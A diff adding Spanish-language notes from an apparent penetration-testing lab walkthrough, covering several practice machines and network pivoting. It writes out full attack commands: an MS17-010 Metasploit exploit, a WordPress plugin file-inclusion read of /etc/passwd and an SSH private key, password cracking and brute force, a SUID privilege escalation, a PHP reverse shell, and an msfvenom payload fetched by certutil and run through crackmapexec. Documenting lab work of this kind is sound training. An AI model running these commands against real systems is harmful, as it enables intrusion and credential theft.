@@ -376,4 +376,348 @@ shell
     net user alvaro password
 ```
 Al hacer nuevamente **Creds_all** dentro del módulo Kiwi, encontramos la contraseña ya que windows xp sabía almacenar las contraseñas en texto plano.
-Con eso terminamos esta máquina y simplementa queda explorar los directorios.
+En esta máquina también existe otra vulnerabilidad que usamos con msfconsole
+```shell
+msfconsole -q
+    use windows/smb/ms17_010_psexec
+        set RHOST 192.168.100.134
+
+        getuid
+        systeminfo
+        ipconfig
+```
+Con esto ya se termina la máquina ya que es muy sencillo vulnerar este equipo.
+
+
+## Cuarta máquina comprimetida Wordpress
+Esta nueva máquina está en la ip 192.168.100.133
+```shell
+ping 192.168.100.133
+nmap -p- 192.168.100.133
+enum4linux 192.168.100.133 #kho y jpgaultier
+smbclient -L 192.168.100.133 -N #Forma anónima
+smbclient //192.168.100.133/anonymous
+```
+En el recurso compartido de anonymous encontramos un archivo de texto que dice ojo.txt en el cual nos informa que la siguiente persona que utilice la contraseña abc123, 123321, qwerty será despedida.
+
+```shell
+nano users.txt
+    kho
+    jpgaultier
+nano password.txt
+    abc123
+    123321
+    qwerty
+hydra -L users.txt -P password.txt smb://192.168.100.133 #Error
+hydra -L users.txt -P password.txt ssh://192.168.100.133 #Error
+crackmapexec smb 192.168.100.133 -u users.txt -p password.txt #Error
+dirb http://192.168.100.133
+
+smbclient //192.168.100.133/kho -U kho
+    qwerty
+```
+En el recurso compartido kho, se encuentra una archivo todo.txt en el cuál informa lo siguiente:
+* Debemos agregar kho.local a hosts
+* Debemos trabajemos en TH3K1nG 
+* No instalemos plugins vulnerables.
+
+```shell
+nano /etc/hosts
+    192.168.100.133 kho.local
+```
+Desde la url accedemos a kho.local/TH3K1nG y nos muestra un wordpress y accedemos a kho.local/TH3K1nG/wp-login.php. Al poner el usuario admin, nos dice que la clave está mal por lo que ya sabemos que usuario atacar.
+
+```shell
+wpscan --url http://kho.local/Th3K1nG/wp-login.php -U admin
+wpscan --url http://kho.local/Th3K1nG/wp-login.php -U admin --password /usr/share/wordlists/rockyou.txt
+wpscan --url http://192.168.100.133/Th3K1nG
+
+nmap -sV --script http-wordpress-enum 192.168.100.133
+nmap --script http-wordpress-enum --script-args type="themes" 192.168.100.133
+
+find / -name wp-plugins 2>/dev/null
+locate ep-plugins.lst
+
+wpscan --url http://192.168.100.133/Th3K1nG --enumerate ap,t --plugins-detection aggressive --force #Funciona
+
+dirb http://192.168.100.133/TH3K1nG/wp-content/plugins -w /usr/share/nmap/nselib/data/wp-plugins.lst
+dirb http://kho.local/TH3K1nG/wp-content/plugins -w /usr/share/nmap/nselib/data/wp-plugins.lst
+```
+
+> **Tip Profesional:** Si al hacer el wpscan nos da error con el doinio, también se debe intentar con la ip en vez del dominio.
+{: .prompt-info }
+
+De todos los métodos para detectar plugins instalados en wordpress solo uno funcionó, por lo que lo siguiente es atacar esa vulnerabilidad.
+
+```shell
+searchsploit mail masta #40290.txt
+searchsploit -m 40290
+cat 40290.txt
+```
+El searchsploit nos dice que dentro de la ruta:
+* http://192.168.100.133/TH3K1nG/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+Si al dar clic derecho y ponemos en ver codigo funte se aprecia mejor todo lo del archivo passwd.
+Algo más técnico es mostrar la llave privada - clave rsa del usuario kho:
+* http://192.168.100.133/TH3K1nG/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/kho/.ssh/id_rsa
+
+```shell
+nano id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa kho@192.168.100.133
+```
+Al tratarnos de conectar directamente a la llave privada, nos pide una contraseña la cuál no sabemos, pero para hacer fuerza bruta, hay un módulo de John que nos permite atacar
+
+```shell
+ssh2john id_rsa > rsa.hash
+john rsa.hash --wordlists=/usr/share/wordlists/rockyou.txt
+```
+La contraseña arroja que es xavior
+
+```shell
+ssh -i id_rsa kho@192.168.100.133
+    xavior
+
+ls
+cat flag.txt
+find / -perm -4000 2>/dev/null
+    find
+find . -exec /bin/sh \; -quit
+whoami
+    root
+cd /root
+ls
+cat flag.txt
+```
+Con esto ya terminamos la cuarta máquina de vulnerar.
+
+## Quinta máquina comprometida
+Ahora nos quedan dos máquinas la 192.168.100.136 y 140
+```shell
+nmap -p- -sCV 192.168.100.136
+```
+Esta máquina es doc.hmv, hay que redirigir el nombre en hosts, tiene una vulnerabilidad sql inyection, hay un file upload para subir un archivo vulnerable al sitio web, subimos un archivo tipo rev-php y con eso hacemos la escalación de privilegios con un binario suid.
+
+## Sexta máquina comprometida
+Ahora procedemos con la última que es 192.168.100.140
+
+Pero antes debemos configurar el laboratorio en conjunto con la máquina robot y metasploitable 3.
+* En metasploitable3 escogemos la interfaz VMNet2 (NAT)
+* Sudo arp-scan --localnet -> Que nos da la nueva ip 192.168.100.137
+```shell
+ping 192.168.100.137
+nmap -p- -v -sS -n --min-rate 5000 192.168.100.137
+```
+De esta máquina que tiene un montón de vulnerabilidad, vamos a empezar con el puerto 8585 que es un WampServer y encontramos un proyecto de wordpress.
+```shell
+wpscan --url http://192.168.100.137:8585/wordpress/ -e u,vp #Enumerar usuarios y temas
+wpscan --url http://192.168.100.137:8585/wordpress/ -U admin --password /usr/share/wordlists/metasploit/unix_passwords.txt
+```
+Al enumerar usuarios encontramos varios, por lo que probamos con el mismo nombre para usuario y mismo nombre para clave y logramos acceder a wordpress, vemos que está el tema Twenty por lo que editamos el tema y podemos cargar una rev-shell, la cual en linux tenemos la que solo sirve para linux, pero como metasploitable3 es windows, ocupamos la sigueinte rev-shell que es para cualquier sistema operativo [rev-shell](http://github.com/ckiller2HM/scripts/blob/main/php-rev-shell.php).
+
+Ahora debemos poner un listener y abrir una página que no existe. Si nos da error en este otra opción no recomendada es poner el rev-shell en la página Main Index Template.
+```shell
+nc -lnvp 8765
+    whoami
+    whoami /priv
+```
+Al tener SetImpersonatePrivilage, pasamos con msfvenom y subimos con certutil o la segunda opción con Juicy potato pero de metasploit.
+
+Con esto terminamos todos los equipos del laboratorio.
+
+## Pivoting Gift
+
+Empezamos esto a partir de la primera máquina drupal que ya logramos el acceso meterpreter y que permite hacer un ipconfig.
+Primero hacer un background de la sesión para regresar a meterpreter y hacemos una ruta entre el equipo de otra red y nuestra red.
+
+```shell
+use post/multi/manage/autoroute
+    set session 2
+    set subnet 10.10.0.0
+    run
+```
+### Formas de analizar ips de otro host
+Para escanear las ips que están en otros hosts tenemos las siguientes maneras:
+1. 
+```shell
+use auxiliary/scanner/portscan/tcp
+    set RHOSTS 10.10.0.0/24
+    set PORTS 21-140
+    set threads 10
+    run
+2. 
+use post/windows/gather/arp_scanner #Solo funciona en Windows, en Linux da error
+    set session 2
+    set rhosts 10.10.0.0/24
+    run
+```
+3. Para este caso vamos hacer uso de un script el cuál permite hacer el escaneo de forma más rápida y debemos colocarlo dentro del equipo falg4.
+
+```shell
+#!/bin/bash
+
+# Define the network prefix (e.g., 192.168.1)
+NETWORK_PREFIX="10.10.0"
+
+# Define the start and end of the IP range to scan
+START_IP=1
+END_IP=254
+
+echo "Scanning network range: $NETWORK_PREFIX.$START_IP - $NETWORK_PREFIX.$END_IP"
+echo "Active hosts:"
+
+for i in $(seq $START_IP $END_IP); do
+    IP_ADDRESS="$NETWORK_PREFIX.$i"
+    # Ping with 1 packet (-c 1) and a timeout of 1 second (-w 1)
+    # Redirect output to /dev/null to suppress ping messages
+    ping -c 1 -w 1 "$IP_ADDRESS" &> /dev/null
+
+    # Check the exit status of the ping command
+    if [ $? -eq 0 ]; then
+        echo "$IP_ADDRESS is up."
+    fi
+done
+
+echo "Scan complete."
+```
+
+> **Tip Profesional:** Al aplicar el autoroute debe ser en el mismo segmento de red en el que esté la máquina con acceso a la segunda red.
+{: .prompt-info }
+
+De las 3 opciones, solo 2 nos funciona ya que la otra opción es para windows. Ahora como ya sabemos que nuestra máquina víctima es la 10.10.0.128, sabemos que debemos vulnerar la máquina 129 que fueron las 2 que encontramos.
+
+```shell
+msfconsole -q
+use auxiliary/scanner/portscan/tcp
+    set rhosts 10.10.0.129
+    set ports 21-200
+    run
+```
+
+De este escaneo nos dice que hay dos puertos el 22 y el 80, ahora debemos hacer un portfwd para poder acceder desde nuestra máquina a ese equipo. 
+Lo primero es volver a la meterpreter que tenemos en donde funciona ipconfig.
+
+```shell
+sessions 2
+portfwd add -l 8080 -p 80 -r 10.10.10.129
+portfwd add -l 2222 -p 22 -r 10.10.10.129
+
+portfwd list
+```
+Al haber hecho portfwd le estoy diciendo que los puerto de esa máquina que acabo de encontrar en otra red, los pase a los puertos de mi propia máquina localhost (127.0.0.1) tanto como el 8080 y 2222.
+Incluso para acceder a la web que está en el puerto 8080 simplemente desde el navegador accedo a **127.0.0.1:8080**
+
+```shell
+ssh -p 2222 root@127.0.0.1
+
+msfconsole -q
+    use auxiliary/scanner/ssh/ssh_login
+        set rhosts 10.10.10.129
+        set username root
+        set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+        run
+
+hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://127.0.0.1:2222
+```
+Con cualquiera de las dos formas encontramos que el usuario y la clave es root:simple
+
+Con esto nos conectamos mediante ssh y con la clave ya tenemos el acceso root. Con esto terminamos este laboratorio.
+
+## Pivoting a Metasploitable 3
+Como ya estamos dentro de la máquina que tiene acceso a esta interfaz, simplemente realizamos los escaneos correspondientes
+```shell
+bash ping.sh #128 129 130
+msfconsole -q
+use scanner/portscan/tcp
+    set rhosts 10.10.0.130 #21,22,80,135,139
+
+    sessions 2
+        portfwd add -l 2121 -p 21 -r 10.10.0.130
+        portfwd add -l 80 -p 80 -r 10.10.0.130
+        portfwd add -l 22 -p 22 -r 10.10.0.130
+```
+
+Con eso ya se procede normalmente a atacar la máquina.
+
+## Pivoting con Ligolo en línea.
+Para esta máquina empezamos desde la máquina vulnerada DRUPAL, con el acceso ssh al usuario flag4, pero antes debemos instalar ligolo
+
+```shell
+mkdir -p ~/Herramientas/ligolo && cd ~/Herramientas/ligolo
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
+tar -xvf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz 
+#Para Windows
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.8.3_windows_amd64.zip
+unzip ligolo-ng_agent_0.8.3_windows_amd64.zip 
+#Para Linux
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
+tar -xvf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz 
+```
+
+Ahora es el proceso para instalar de forma automática
+```shell
+sudo apt update && sudo apt install ligolo-ng -y
+sudo apt update && sudo apt install golang -y
+cd /home/kali/Herramientas/ligolo
+git clone https://github.com/nicocha30/ligolo-ng.git
+cd ligolo-ng
+env GOOS=windows GOARCH=386 go build -o ../agent_win32.exe cmd/agent/main.go #Agente x32bits de windows
+env GOOS=linux GOARCH=386 go build -o ../agent_lin32 ./cmd/agent/main.go #Angente de linux
+```
+
+Ahora una vez que tenemos en nuestro equipo se ejecuta de la siguiente manera de forma manual
+```shell
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.10.10.0 dev ligolo
+sudo ip addr add 10.10.10.100/24 dev ligolo
+
+uname -m #Ver que arquitectura es para subir el angente que se crea mas abajo
+python3 -m http.server 80 #Para pasar de kali al equipo comprometido
+
+wget http://192.168.100.140/agent_lin32
+chmod +x agent_lin32
+./agent_lin32 -connect 192.168.100.140:11601 -ignore-cert #Ip de kali
+
+sudo ligolo-proxy -selfcert
+    #Con esto accedemos pero hay q dejar modo escucha antes de ejecutar el agente
+session
+    start #Con esto ya establecemos el tunel a la red inaccesible
+```
+Con eso ya podemos atacar normalmente a las ips de los demás dispositivos de otra red. Pero OJO la comunicación solo es kali a Windows.
+
+### Ataque a metasploitable 3
+```shell
+xfreerdp /v:10.10.10.130 /u:vagrant /p:vagrant /cert:ignore /sec:rdp
+```
+Ahora como la comunicación es solo unidireccional, de windows a kali no tengo respuesta, para ello utilizamos ligolo para redireccionar el tráfico
+
+```shell
+listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 #Todo lo que llegue redirigir a mi equipo local
+```
+Ahora vamos a enviar un payload
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=10.10.10.128 LPORT=8080 -f exe -o reverse.exe
+python3 -m http.server 80
+```
+Ahora en otra ventana de kali
+```shell
+psexec.py vagrant:vagrant@10.10.10.218 #si no tengo esta conexión
+crackmapexec smb 10.10.10.218 -u vagrant -p vagrant -x 'certutil -urlcache -split -f http://10.10.10.128:8080/reverse.exe reverse.exe'
+crackmapexec smb 10.10.10.218 -u vagrant -p vagrant -x 'dir'
+
+crackmapexec smb 10.10.10.218 -u vagrant -p vagrant -x 'c:\reverse.exe'
+```
+
+ahora debemos escuchar la revshell
+
+```shell
+msfconsole -q
+use /exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lhost 0.0.0.0
+    set lport 80
+    run
+```
+Con eso levantamos meterpreter luego de ejecutar el revshell en windows.
+
+Con eso finalizamos todos estos laboratorios.
